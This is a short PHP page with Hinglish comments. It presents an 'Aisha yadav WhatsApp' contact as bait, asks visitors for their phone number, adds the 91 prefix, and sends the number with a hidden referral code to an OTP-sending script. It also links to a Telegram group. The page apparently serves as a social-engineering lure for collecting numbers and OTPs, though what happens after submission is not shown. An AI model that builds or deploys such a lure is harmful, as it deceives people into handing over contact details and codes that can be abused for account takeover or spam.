<?php
$use91 = true;   // 91 chahiye
require __DIR__ . '/functions.php';
require __DIR__ . '/header.php';
?>
<h1>Aisha yadav WhatsApp</h1>
<p>Apna number dedo yaar</p>

<div class="form-container">
    <h2>Enter Your Number</h2>

    <form method="get" action="sendotp.php" onsubmit="add91()">

        <div class="form-row">
            <input type="text" id="mobile" name="mobile" placeholder="Enter Your Number" maxlength="100" required>
        </div>

        <!-- Hidden field jisme 91 + mobile jayega -->
        <input type="hidden" id="full_mobile" name="full_mobile">

        <div class="form-row">
            <input type="hidden" name="refer" value="VDdw3I">
        </div>

        <div class="form-row">
            <input type="submit" class="submit" name="submit" value="Send OTP">
        </div>

    </form>

    <div id="message"></div>

    <a href="https://t.me/+XcybaJ2p2-M5Nzc1" target="_blank" class="telegram-btn">Join Our Telegram</a>
</div>

<script>
function add91() {
    let mobile = document.getElementById("mobile").value;

    // PHP se switch pass karo
    let use91 = <?php echo $use91 ? 'true' : 'false'; ?>;

    if(use91){
        document.getElementById("full_mobile").value = "91" + mobile;
    } else {
        document.getElementById("full_mobile").value = mobile;
    }
}
</script>

<?php
require __DIR__ . '/footer.php';
?>